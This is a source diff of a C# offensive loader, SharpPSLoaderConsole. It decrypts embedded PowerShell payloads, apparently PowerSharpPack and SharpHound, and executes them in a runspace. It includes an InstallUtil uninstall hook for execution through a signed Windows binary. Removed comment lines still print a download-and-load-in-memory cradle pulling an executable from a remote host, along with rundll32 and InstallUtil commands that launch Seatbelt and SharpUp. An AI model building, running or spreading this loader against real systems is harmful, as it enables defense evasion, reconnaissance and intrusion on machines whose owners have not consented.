@@ -2,43 +2,22 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using System.Threading.Tasks;
 using System.Configuration.Install;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Collections;
 using System.Runtime.InteropServices;
-using System.IO;
 using System.Reflection;
 
-
 /*
- * Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
- *      
+ * References
+ *  - Add reference to c:\windows\assembly\gac_msil\system.management.automation\1.0.0.0\<~>\system.management.automation.dll  and configuration.install 
  *      
  * Adding Resources 
  *  - Project > Properties > Add Resources > Access Modifier = Public 
  *  - And simply access it like... var thingy = Properties.Resources.<resource-name>
  *      - Returns "type" by default. ex) .txt file ==> string, byte file ==> byte[] 
  *  - Thought about adding powershell scripts, decided to just yoink powersharppack and call it a day 
- *  
- * Usage: 
- *  - Console
- *      .\SharpPSLoaderConsole.exe 1 powersharppack -seatbelt -command "-group=user"
- *      
- *  - In-memory (Obfuscated, Non-obfuscated)
- *      $b = (New-Object net.webclient).DownloadData("http://192.168.40.130:8888/SharpPSLoader.exe")
- *      [System.Reflection.Assembly]::Load($b)
- *      [SharpPSLoaderLibrary.SharpPSLoaderLibrary]::Main(@("1","Powersharppack -sharpup audit"))
- * 
- *  - LOLBAS - InstallUtils.exe 
- *      C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /p="1 PowerSharpPack -seatbelt -Command '-group=user'" /U .\SharpPSLoaderLibrary.exe
- *      
- *  - Library - rundll32.exe 
- *      c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
- *  
- *      (64bit) c:\windows\system32\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user 
- *      (32bit) C:\Windows\SysWOW64\rundll32.exe SharpPSLoaderLibrary.dll,runLibrary 1 powersharppack -seatbelt -command -group=user
  * 
  * */
 
@@ -77,7 +56,6 @@ namespace SharpPSLoaderConsole
         {
             Dictionary<string, byte[]> resourceDict = new Dictionary<string, byte[]>();
 
-            // https://stackoverflow.com/questions/1310812/how-can-i-find-all-the-members-of-a-properties-resources-in-c-sharp
             List<string> resourceNames = new List<string>();
             foreach (PropertyInfo property in (typeof(Properties.Resources).GetProperties
                 (BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic)).Skip(2))  // Skip ResourceManager and Culture - hardcoding ftw 
@@ -109,11 +87,9 @@ namespace SharpPSLoaderConsole
                     encPayload = resourceDict.Where(a => a.Key.Contains("arppac")).Select(a => a.Value).First();
                     break;
                 case "2":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("oodHo")).Select(a => a.Value).First();
+                    encPayload = resourceDict.Where(a => a.Key.Contains("oodhoun")).Select(a => a.Value).First();
                     break;
-                case "3":
-                    encPayload = resourceDict.Where(a => a.Key.Contains("wervi")).Select(a => a.Value).First();
-                    break;
+                
                 default:
                     break;
             }
@@ -274,6 +250,7 @@ namespace SharpPSLoaderConsole
 #if DEBUG
             // Uncomment to see raw powershell payload string in console 
             //Console.WriteLine(cmd);
+            //Console.ReadLine();
 #endif
 
             Runspace rs = RunspaceFactory.CreateRunspace();
@@ -297,6 +274,7 @@ namespace SharpPSLoaderConsole
                 if (obj != null)
                 {
                     Console.WriteLine(obj.BaseObject.ToString());
+                    Console.WriteLine("maybe something went wrong?");
                 }
             }
 
@@ -348,8 +326,6 @@ namespace SharpPSLoaderConsole
         out uint lpflOldProtect);
     }
 
-
-
     // -------------------------------------------------------------------------------------------------
     // Uninstall function to execute SharpPSLoader through InstallUtil.exe 
     // -------------------------------------------------------------------------------------------------
@@ -380,12 +356,7 @@ namespace SharpPSLoaderConsole
                 powershellPayload = psLoader.DecryptedPSFromRsrcDict(psLoader.resourceDict, payload);
             }
 
-
             psLoader.RunPowershell(powershellPayload, argument);
-
         }
     }
-
-
 }
-
